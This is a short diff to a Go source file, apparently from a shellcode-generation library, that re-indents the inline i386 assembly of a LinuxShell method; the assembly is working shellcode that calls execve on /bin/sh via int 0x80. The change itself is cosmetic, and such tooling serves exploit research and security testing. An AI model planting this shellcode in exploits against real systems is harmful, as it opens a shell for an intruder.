@@ -23,14 +23,15 @@ func NewI386() *I386 {
 
 // LinuxShell is a method for JIT compiling shellcode that executes /bin/sh
 func (i386 *I386) LinuxShell() ([]byte, error) {
-	instrs := `xor ecx, ecx
-               mul ecx
-               push ecx
-               push 0x68732f2f
-               push 0x6e69622f
-               mov ebx, esp
-               mov al, 0xb
-               int 0x80
+	instrs := `
+xor ecx, ecx
+mul ecx
+push ecx
+push 0x68732f2f
+push 0x6e69622f
+mov ebx, esp
+mov al, 0xb
+int 0x80
 `
 	return sp.Asm(i386.arch, instrs)
 }
